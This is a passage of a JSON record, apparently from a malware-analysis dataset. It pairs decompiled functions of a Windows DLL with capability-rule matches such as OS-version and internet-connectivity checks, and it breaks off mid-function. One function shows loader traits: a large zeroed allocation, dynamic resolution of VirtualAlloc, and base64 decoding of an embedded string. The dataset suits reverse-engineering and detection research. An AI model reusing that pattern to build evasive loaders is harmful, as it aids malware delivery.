{\ncode_r0x00018001e72b:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x00018001e72f:\n            uVar9 = 10;\ncode_r0x00018001e737:\n            pcVar8 = fcn.180020890(arg1, uVar9);\n        }\n        else {\n            if (uVar1 == 0x41) goto code_r0x00018001e73e;\n            if (uVar1 == 0x43) {\ncode_r0x00018001e6a9:\n                pcVar8 = fcn.180020520(arg1);\n            }\n            else {\n                if (uVar1 < 'E') goto code_r0x00018001e747;\n                if (uVar1 < 'H') goto code_r0x00018001e73e;\n                if (uVar1 == 0x53) {\ncode_r0x00018001e6e7:\n                    pcVar8 = fcn.1800213f4(arg1);\n                }\n                else {\n                    if (uVar1 == 0x58) goto code_r0x00018001e6fc;\n                    if (uVar1 != 0x5a) {\n                        if (uVar1 != 0x61) {\n                            if (uVar1 != 99) goto code_r0x00018001e747;\n                            goto code_r0x00018001e6a9;\n                        }\n                        goto code_r0x00018001e73e;\n                    }\n                    pcVar8 = fcn.18001f858(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if ('g' < uVar1) {\n            if (uVar1 == 0x69) goto code_r0x00018001e72b;\n            if (uVar1 == 0x6e) {\n                pcVar8 = fcn.180021030(arg1);\n                goto code_r0x00018001e743;\n            }\n            if (uVar1 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                uVar9 = 8;\n            }\n            else if (uVar1 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x00018001e6fc:\n                uVar9 = 0x10;\n            }\n            else {\n                if (uVar1 == 0x73) goto code_r0x00018001e6e7;\n                if (uVar1 == 0x75) goto code_r0x00018001e72f;\n                if (uVar1 != 0x78) goto code_r0x00018001e747;\n                uVar9 = 0x10;\n            }\n            goto code_r0x00018001e737;\n        }\ncode_r0x00018001e73e:\n        pcVar8 = fcn.18001fbe0(arg1);\n    }\ncode_r0x00018001e743:\n    if (pcVar8 == '\\0') {\ncode_r0x00018001e747:\n        return pcVar8 & 0xffffffffffffff00;\n    }\n    if (arg1[0x40] != 0) goto code_r0x00018001e882;\n    uVar3 = *(arg1 + 0x30);\n    uStackX8 = 0;\n    arg3 = 0;\n    uStackX10 = 0;\n    if ((uVar3 >> 4 & 1) != 0) {\n        if ((uVar3 >> 6 & 1) == 0) {\n            if ((uVar3 & 1) == 0) {\n                if ((uVar3 >> 1 & 1) == 0) goto code_r0x00018001e7a0;\n                uStackX8 = 0x20;\n            }\n            else {\n                uStackX8 = 0x2b;\n            }\n        }\n        else {\n            uStackX8 = 0x2d;\n        }\n        arg3 = 1;\n    }\ncode_r0x00018001e7a0:\n    uVar1 = arg1[0x41];\n    if (((uVar1 + 0xa8 & 0xdf) == 0) && ((uVar3 >> 5 & 1) != 0)) {\n        bVar5 = true;\n    }\n    else {\n        bVar5 = false;\n    }\n    if ((bVar5) || ((uVar1 + 0xbf & 0xdf) == 0)) {\n        *(&uStackX8 + arg3) = 0x30;\n        if ((uVar1 == 0x58) || (uVar1 == 0x41)) {\n            uVar10 = 0x58;\n        }\n        *(&uStackX8 + arg3 + 1) = uVar10;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar11 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar3 & 0xc) == 0) {\n        fcn.180019bd8(arg1_00, CONCAT71(uVar3 >> 8, 0x20), uVar11, arg4);\n    }\n    arg2 = &uStackX8;\n    fcn.18002279c(arg1_00, arg2, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.180019bd8(arg1_00, CONCAT71(arg2 >> 8, 0x30), uVar11, arg4);\n    }\n    uVar9 = 0;\n    pcVar8 = fcn.180022488(arg1);\n    if ((-1 < *arg4) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        pcVar8 = fcn.180019bd8(arg1_00, CONCAT71(uVar9 >> 8, 0x20), uVar11, arg4);\n    }\ncode_r0x00018001e882:\n    return pcVar8 & 0xffffffffffffff00 | 1;\n}\n",
        "token_count": 2599
    },
    "18002cfe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.18002cfe8(char param_1)\n\n{\n    char acStackX8 [8];\n    ulong var_18h_2;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_20h_2;\n    ulong *var_18h;\n    char *var_10h;\n    ulong *var_bp_8h;\n    \n    var_28h._0_4_ = 0;\n    var_18h = &var_28h;\n    var_20h._0_4_ = 0;\n    var_10h = acStackX8;\n    var_bp_8h = &var_20h;\n    var_20h_2._0_4_ = 8;\n    var_20h_2._4_4_ = 8;\n    acStackX8[0] = param_1;\n    fcn.18002ccf8(&var_18h_2, &var_20h_2 + 4, &var_18h, &var_20h_2);\n    if (acStackX8[0] != '\\0') {\n        var_20h._0_4_ = var_28h;\n    }\n    return var_20h;\n}\n",
        "token_count": 285
    },
    "18002d78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.18002d78c(uint16_t *arg1, uint8_t *arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int64_t iStack40;\n    int64_t aiStack32 [2];\n    char cStack16;\n    \n    if ((arg2 == NULL) || (arg3 == 0)) {\n        *0x1800921e8 = 0;\n        return 0;\n    }\n    if (*arg2 == 0) {\n        if (arg1 == NULL) {\n            return 0;\n        }\n        *arg1 = 0;\n        return 0;\n    }\n    fcn.180013d7c(&iStack40, arg4);\n    if (*(aiStack32[0] + 0xc) == 0xfde9) {\n        iVar1 = fcn.180036218(arg1);\n        if (iVar1 < 0) {\n            iVar1 = -1;\n        }\n        goto code_r0x00018002d829;\n    }\n    if (*(aiStack32[0] + 0x138) == 0) {\n        if (arg1 != NULL) {\n            *arg1 = *arg2;\n        }\ncode_r0x00018002d824:\n        iVar1 = 1;\n    }\n    else {\n        iVar1 = fcn.1800360a8(*arg2, aiStack32);\n        if (iVar1 == 0) {\n            iVar1 = fcn.1800298a8(*(aiStack32[0] + 0xc), 9);\n            if (iVar1 != 0) goto code_r0x00018002d824;\n        }\n        else if ((((1 < *(aiStack32[0] + 8)) && (*(aiStack32[0] + 8) <= arg3)) &&\n                 (iVar1 = fcn.1800298a8(*(aiStack32[0] + 0xc), 9),  iVar1 != 0)) ||\n                ((*(aiStack32[0] + 8) <= arg3 && (arg2[1] != 0)))) {\n            iVar1 = *(aiStack32[0] + 8);\n            goto code_r0x00018002d829;\n        }\n        puVar2 = fcn.180023574();\n        iVar1 = -1;\n        *puVar2 = 0x2a;\n    }\ncode_r0x00018002d829:\n    if (cStack16 != '\\0') {\n        *(iStack40 + 0x3a8) = *(iStack40 + 0x3a8) & 0xfffffffd;\n        return iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 606
    },
    "1800410e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.1800410e4(uchar (*arg1) [16], ulong arg2)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uchar (*pauVar3) [16];\n    int32_t iVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    char cVar12;\n    char cVar13;\n    char cVar14;\n    uchar auVar11 [16];\n    uchar in_XMM1 [16];\n    uchar auVar16 [16];\n    uint8_t uVar15;\n    \n    pauVar3 = NULL;\n    if (arg2 == 0) {\n        pcVar5 = arg1 & 0xfffffffffffffff0;\n        auVar11 = ZEXT416(CONCAT13(-(pcVar5[3] == '\\0'), \n                                   CONCAT12(-(pcVar5[2] == '\\0'), CONCAT11(-(pcVar5[1] == '\\0'), -(*pcVar5 == '\\0')))))\n                  & 0xffffffffffffffff;\n        uVar15 = -(SUB161(auVar11 >> 0x78, 0) == pcVar5[0xf]);\n        auVar11 = CONCAT115(uVar15, CONCAT114(-(SUB161(auVar11 >> 0x70, 0) == pcVar5[0xe]), \n                                              CONCAT113(-(SUB161(auVar11 >> 0x68, 0) == pcVar5[0xd]), \n                                                        CONCAT112(-(SUB161(auVar11 >> 0x60, 0) == pcVar5[0xc]), \n                                                                  CONCAT111(-(SUB161(auVar11 >> 0x58, 0) == pcVar5[0xb])\n                                                                            , CONCAT110(-(SUB161(auVar11 >> 0x50, 0) ==\n                                                                                         pcVar5[10]), \n                                                                                        CONCAT19(-(SUB161(auVar11 >>\n                                                                                                          0x48, 0) ==\n                                                                                                  pcVar5[9]), \n                                                                                                 CONCAT18(-(SUB161(\n                                                            auVar11 >> 0x40, 0) == pcVar5[8]), \n                                                            CONCAT17(-(pcVar5[7] == '\\0'), \n                                                                     CONCAT16(-(pcVar5[6] == '\\0'), \n                                                                              CONCAT15(-(pcVar5[5] == '\\0'), \n                                                                                       CONCAT14(-(pcVar5[4] == '\\0'), \n                                                                                                SUB164(auVar11, 0)))))))\n                                                            ))))));\n        uVar2 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar15 >> 7) << 0xf) & -1 << (arg1 & 0xf);\n        pcVar6 = pcVar5;\n        if (uVar2 == 0) {\n            do {\n                pcVar5 = pcVar6 + 0x10;\n                auVar11 = ZEXT416(CONCAT13(-(pcVar6[0x13] == '\\0'), \n                                           CONCAT12(-(pcVar6[0x12] == '\\0'), \n                                                    CONCAT11(-(pcVar6[0x11] == '\\0'), -(*pcVar5 == '\\0'))))) &\n                          0xffffffffffffffff;\n                uVar15 = -(SUB161(auVar11 >> 0x78, 0) == pcVar6[0x1f]);\n                auVar11 = CONCAT115(uVar15, CONCAT114(-(SUB161(auVar11 >> 0x70, 0) == pcVar6[0x1e]), \n                                                      CONCAT113(-(SUB161(auVar11 >> 0x68, 0) == pcVar6[0x1d]), \n                                                                CONCAT112(-(SUB161(auVar11 >> 0x60, 0) == pcVar6[0x1c])\n                                                                          , CONCAT111(-(SUB161(auVar11 >> 0x58, 0) ==\n                                                                                       pcVar6[0x1b]), \n                                                                                      CONCAT110(-(SUB161(auVar11 >> 0x50\n                                                                                                         , 0) ==\n                                                                                                 pcVar6[0x1a]), \n                                                                                                CONCAT19(-(SUB161(\n                                                            auVar11 >> 0x48, 0) == pcVar6[0x19]), \n                                                            CONCAT18(-(SUB161(auVar11 >> 0x40, 0) == pcVar6[0x18]), \n                                                                     CONCAT17(-(pcVar6[0x17] == '\\0'), \n                                                                              CONCAT16(-(pcVar6[0x16] == '\\0'), \n                                                                                       CONCAT15(-(pcVar6[0x15] == '\\0')\n                                                                                                , CONCAT14(-(pcVar6[0x14\n                                                            ] == '\\0'), SUB164(auVar11, 0)))))))))))));\n                uVar1 = SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar15 >> 7) << 0xf;\n                uVar2 = uVar1;\n                pcVar6 = pcVar5;\n            } while (uVar1 == 0);\n        }\n        uVar7 = 0;\n        if (uVar2 != 0) {\n            for (; (uVar2 >> uVar7 & 1) == 0; uVar7 = uVar7 + 1) {\n            }\n        }\n        pauVar3 = pcVar5 + uVar7;\n    }\n    else if (*0x180090018 < 2) {\n        pcVar5 = arg1 & 0xfffffffffffffff0;\n        uVar15 = arg1 & 0xf;\n        auVar16 = pshuflw(in_XMM1, ZEXT416((arg2 & 0xff) << 8 | arg2 & 0xff), 0);\n        auVar11 = CONCAT115(-(pcVar5[0xf] == '\\0'), \n                            CONCAT114(-(pcVar5[0xe] == '\\0'), \n                                      CONCAT113(-(pcVar5[0xd] == '\\0'), \n                                                CONCAT112(-(pcVar5[0xc] == '\\0'), \n                                                          CONCAT111(-(pcVar5[0xb] == '\\0'), \n                                                                    CONCAT110(-(pcVar5[10] == '\\0'), \n                                                                              CONCAT19(-(pcVar5[9] == '\\0'), \n                                                                                       CONCAT18(-(pcVar5[8] == '\\0'), \n                                                                                                CONCAT17(-(pcVar5[7] ==\n                                                                                                          '\\0'), \n                                                            CONCAT16(-(pcVar5[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar5[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar5[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar5[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar5[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar5[1] == '\\0'), -(*pcVar5 == '\\0'))))))))))))\n                                                         ))));\n        cVar10 = SUB161(auVar16, 0);\n        cVar12 = SUB161(auVar16 >> 8, 0);\n        cVar13 = SUB161(auVar16 >> 0x10, 0);\n        cVar14 = SUB161(auVar16 >> 0x18, 0);\n        auVar16 = CONCAT115(-(cVar14 == pcVar5[0xf]), \n                            CONCAT114(-(cVar13 == pcVar5[0xe]), \n                                      CONCAT113(-(cVar12 == pcVar5[0xd]), \n                                                CONCAT112(-(cVar10 == pcVar5[0xc]), \n                                                          CONCAT111(-(cVar14 == pcVar5[0xb]), \n                                                                    CONCAT110(-(cVar13 == pcVar5[10]), \n                                                                              CONCAT19(-(cVar12 == pcVar5[9]), \n                                                                                       CONCAT18(-(cVar10 == pcVar5[8]), \n                                                                                                CONCAT17(-(cVar14 ==\n                                                                                                          pcVar5[7]), \n                                                                                                         CONCAT16(-(\n                                                            cVar13 == pcVar5[6]), \n                                                            CONCAT15(-(cVar12 == pcVar5[5]), \n                                                                     CONCAT14(-(cVar10 == pcVar5[4]), \n                                                                              CONCAT13(-(cVar14 == pcVar5[3]), \n                                                                                       CONCAT12(-(cVar13 == pcVar5[2]), \n                                                                                                CONCAT11(-(cVar12 ==\n                                                                                                          pcVar5[1]), \n                                                                                                         -(cVar10 ==\n                                                                                                          *pcVar5)))))))\n                                                            )))))))));\n        uVar2 = (SUB161(auVar16 >> 7, 0) & 1 | (SUB161(auVar16 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar16 >> 0x17, 0) & 1) << 2 | (SUB161(auVar16 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar16 >> 0x27, 0) & 1) << 4 | (SUB161(auVar16 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar16 >> 0x37, 0) & 1) << 6 | (SUB161(auVar16 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar16 >> 0x47, 0) & 1) << 8 | (SUB161(auVar16 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar16 >> 0x57, 0) & 1) << 10 | (SUB161(auVar16 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar16 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar16 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar16 >> 0x77, 0) & 1) << 0xe | (-(cVar14 == pcVar5[0xf]) >> 7) << 0xf) & -1 << uVar15;\n        uVar7 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar5[0xf] == '\\0') >> 7) << 0xf) & -1 << uVar15;\n        pcVar6 = pcVar5;\n        if (uVar7 == 0) {\n            do {\n                uVar7 = 0x1f;\n                if (uVar2 != 0) {\n                    for (; uVar2 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n                    }\n                }\n                if (uVar2 != 0) {\n                    pauVar3 = pcVar6 + uVar7;\n                }\n                pcVar5 = pcVar6 + 0x10;\n                auVar11 = ZEXT416(CONCAT13(-(pcVar6[0x13] == '\\0'), \n                                           CONCAT12(-(pcVar6[0x12] == '\\0'), \n                                                    CONCAT11(-(pcVar6[0x11] == '\\0'), -(*pcVar5 == '\\0'))))) &\n                          0xffffffffffffffff;\n                uVar15 = -(SUB161(auVar11 >> 0x78, 0) == pcVar6[0x1f]);\n                auVar16 = CONCAT115(uVar15, CONCAT114(-(SUB161(auVar11 >> 0x70, 0) == pcVar6[0x1e]), \n                                                      CONCAT113(-(SUB161(auVar11 >> 0x68, 0) == pcVar6[0x1d]), \n                                                                CONCAT112(-(SUB161(auVar11 >> 0x60, 0) == pcVar6[0x1c])\n                                                                          , CONCAT111(-(SUB161(auVar11 >> 0x58, 0) ==\n                                                                                       pcVar6[0x1b]), \n                                                                                      CONCAT110(-(SUB161(auVar11 >> 0x50\n                                                                                                         , 0) ==\n                                                                                                 pcVar6[0x1a]), \n                                                                                                CONCAT19(-(SUB161(\n                                                            auVar11 >> 0x48, 0) == pcVar6[0x19]), \n                                                            CONCAT18(-(SUB161(auVar11 >> 0x40, 0) == pcVar6[0x18]), \n                                                                     CONCAT17(-(pcVar6[0x17] == '\\0'), \n                                                                              CONCAT16(-(pcVar6[0x16] == '\\0'), \n                                                                                       CONCAT15(-(pcVar6[0x15] == '\\0')\n                                                                                                , CONCAT14(-(pcVar6[0x14\n                                                            ] == '\\0'), SUB164(auVar11, 0)))))))))))));\n                auVar11 = CONCAT115(-(cVar14 == pcVar6[0x1f]), \n                                    CONCAT114(-(cVar13 == pcVar6[0x1e]), \n                                              CONCAT113(-(cVar12 == pcVar6[0x1d]), \n                                                        CONCAT112(-(cVar10 == pcVar6[0x1c]), \n                                                                  CONCAT111(-(cVar14 == pcVar6[0x1b]), \n                                                                            CONCAT110(-(cVar13 == pcVar6[0x1a]), \n                                                                                      CONCAT19(-(cVar12 == pcVar6[0x19])\n                                                                                               , CONCAT18(-(cVar10 ==\n                                                                                                           pcVar6[0x18])\n                                                                                                          , CONCAT17(-(\n                                                            cVar14 == pcVar6[0x17]), \n                                                            CONCAT16(-(cVar13 == pcVar6[0x16]), \n                                                                     CONCAT15(-(cVar12 == pcVar6[0x15]), \n                                                                              CONCAT14(-(cVar10 == pcVar6[0x14]), \n                                                                                       CONCAT13(-(cVar14 == pcVar6[0x13]\n                                                                                                 ), CONCAT12(-(cVar13 ==\n                                                                                                              pcVar6[\n                                                            0x12]), CONCAT11(-(cVar12 == pcVar6[0x11]), \n                                                                             -(cVar10 == *pcVar5))))))))))))))));\n                uVar1 = SUB161(auVar16 >> 7, 0) & 1 | (SUB161(auVar16 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar16 >> 0x17, 0) & 1) << 2 | (SUB161(auVar16 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar16 >> 0x27, 0) & 1) << 4 | (SUB161(auVar16 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar16 >> 0x37, 0) & 1) << 6 | (SUB161(auVar16 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar16 >> 0x47, 0) & 1) << 8 | (SUB161(auVar16 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar16 >> 0x57, 0) & 1) << 10 | (SUB161(auVar16 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar16 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar16 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar16 >> 0x77, 0) & 1) << 0xe | (uVar15 >> 7) << 0xf;\n                uVar7 = uVar1;\n                uVar2 = SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(cVar14 == pcVar6[0x1f]) >> 7) << 0xf;\n                pcVar6 = pcVar5;\n            } while (uVar1 == 0);\n        }\n        uVar2 = uVar2 & (-uVar7 & uVar7) - 1;\n        uVar7 = 0x1f;\n        if (uVar2 != 0) {\n            for (; uVar2 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n            }\n        }\n        if (uVar2 != 0) {\n            pauVar3 = pcVar5 + uVar7;\n        }\n    }\n    else {\n        while( true ) {\n            bVar8 = false;\n            bVar9 = (arg1 & 0xf) == 0;\n            if (bVar9) break;\n            if ((*arg1)[0] == arg2) {\n                pauVar3 = arg1;\n            }\n            if ((*arg1)[0] == '\\0') {\n                return pauVar3;\n            }\n            arg1 = *arg1 + 1;\n        }\n        while( true ) {\n            iVar4 = pcmpistri(ZEXT416(arg2 & 0xff), *arg1, 0x40);\n            if (bVar8) {\n                pauVar3 = *arg1 + iVar4;\n                bVar9 = pauVar3 == NULL;\n                pcmpistri(ZEXT416(arg2 & 0xff), *arg1, 0x40);\n            }\n            if (bVar9) break;\n            bVar8 = 0xffffffffffffffef < arg1;\n            arg1 = arg1[1];\n            bVar9 = arg1 == NULL;\n        }\n    }\n    return pauVar3;\n}\n",
        "token_count": 5367
    },
    "1800417c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.1800417c0(ulong arg1, ulong arg2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong *arg1_00;\n    uchar *arg3;\n    ulong uVar4;\n    code *pcVar5;\n    ulong *puVar6;\n    uint64_t uVar7;\n    ulong noname_1;\n    uchar *puVar8;\n    bool bVar9;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar extraout_XMM0_02 [16];\n    uchar auVar10 [16];\n    uchar extraout_XMM0_03 [16];\n    uchar extraout_XMM0_04 [16];\n    uchar auStack2904 [32];\n    uint32_t *puStack2872;\n    ulong uStack2864;\n    ulong uStack2856;\n    uint32_t auStack2840 [4];\n    uint uStack2824;\n    uint uStack2820;\n    ulong uStack2816;\n    ulong uStack2808;\n    ulong uStack2800;\n    ulong uStack2792;\n    ulong uStack2784;\n    ulong uStack2776;\n    ulong uStack2768;\n    ulong uStack2760;\n    ulong uStack2752;\n    uchar uStack2744;\n    unkbyte7 Stack2743;\n    ulong uStack2728;\n    uint64_t uStack2720;\n    uchar uStack2696;\n    unkbyte7 Stack2695;\n    ulong uStack2680;\n    uint64_t uStack2672;\n    uchar auStack2664 [2608];\n    uint64_t uStack56;\n    \n    uStack56 = *0x180090000 ^ auStack2904;\n    if (arg2 == 1) {\n        arg3 = NULL;\n        auStack2840[0] = 0;\n        iVar3 = fcn.180014920(100000000);\n        if (iVar3 != 0) {\n            fcn.1800051b0(iVar3, 0, 100000000);\n        }\n        fcn.18001458c(iVar3);\n        fcn.1800121b0(auStack2664, 0x18008a790, 0xa2c);\n        *0x180090a80 = 0;\n        *0x180090a74 = 0;\n        *0x180090a84 = 0;\n        *0x180090a78 = 0;\n        *0x180090a7c = 0;\n        *0x180090a70 = 0;\n        arg1_00 = fcn.180042230(&uStack2696);\n        if (0xf < arg1_00[3]) {\n            arg1_00 = *arg1_00;\n        }\n        puVar6 = &uStack2744;\n        iVar3 = fcn.180042230(puVar6);\n        uVar1 = *(iVar3 + 0x10);\n        if (arg1_00 == NULL) {\n            bVar9 = true;\n            arg1_00 = puVar6;\n            auVar10 = extraout_XMM0;\n        }\n        else {\n            uVar4 = (*_sym.imp.ole32.dll_CoLoadLibrary)(L\"kernel32.dll\", 0);\n            *0x180092a38 = fcn.180041fd0(\"VirtualAlloc\", uVar4);\n            uStack2856 = 0;\n            puStack2872 = auStack2840;\n            uStack2864 = 0;\n            puVar6 = arg1_00;\n            iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(arg1_00, uVar1, 1);\n            if (iVar2 == 0) {\n                bVar9 = true;\n                arg1_00 = puVar6;\n                auVar10 = extraout_XMM0_00;\n            }\n            else {\n                puVar6 = auStack2840[0] + 1;\n                arg3 = fcn.180014920(puVar6);\n                if (arg3 == NULL) {\n                    bVar9 = true;\n                    arg1_00 = puVar6;\n                    auVar10 = extraout_XMM0_01;\n                }\n                else {\n                    uStack2856 = 0;\n                    uStack2864 = 0;\n                    puVar8 = arg3;\n                    for (uVar7 = auStack2840[0] + 1; uVar7 != 0; uVar7 = uVar7 - 1) {\n                        *puVar8 = 0;\n                        puVar8 = puVar8 + 1;\n                    }\n                    puStack2872 = auStack2840;\n                    iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(arg1_00, uVar1, 1);\n                    bVar9 = iVar2 == 0;\n                    auVar10 = extraout_XMM0_02;\n                }\n            }\n        }\n        if (0xf < uStack2672) {\n            puVar6 = CONCAT71(Stack2695, uStack2696);\n            arg1_00 = puVar6;\n            if (0xfff < uStack2672 + 1) {\n                arg1_00 = puVar6[-1];\n                uVar7 = uStack2672 + 0x28;\n                if (0x1f < puVar6 + (-8 - arg1_00)) goto code_r0x000180041d8e;\n            }\n            fcn.18000253c(arg1_00);\n            auVar10 = extraout_XMM0_03;\n        }\n        uStack2680 = 0;\n        uStack2672 = 0xf;\n        uStack2696 = 0;\n        uVar7 = uStack2720;\n        if (0xf < uStack2720) {\n            puVar6 = CONCAT71(Stack2743, uStack2744);\n            uVar7 = uStack2720 + 1;\n            arg1_00 = puVar6;\n            if (0xfff < uVar7) {\n                arg1_00 = puVar6[-1];\n                uVar7 = uStack2720 + 0x28;\n                if (0x1f < puVar6 + (-8 - arg1_00)) {\ncode_r0x000180041d8e:\n                    fcn.18001484c(arg1_00, uVar7);\n                    pcVar5 = swi(3);\n                    (*pcVar5)();\n                    return;\n                }\n            }\n            fcn.18000253c(arg1_00);\n            auVar10 = extraout_XMM0_04;\n        }\n        uStack2728 = 0;\n        uStack2720 = 0xf;\n        uStack2744 = 0;\n        if (bVar9) {\n            iVar2 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n            if (-1 < iVar2) {\n                (*_sym.imp.USER32.dll_LoadStringW)(arg1, 0x67, 0x180092960);\n                (*_sym.imp.USER32.dll_LoadStringW)(arg1, 0x6d, 0x180092890);\n                uStack2824 = 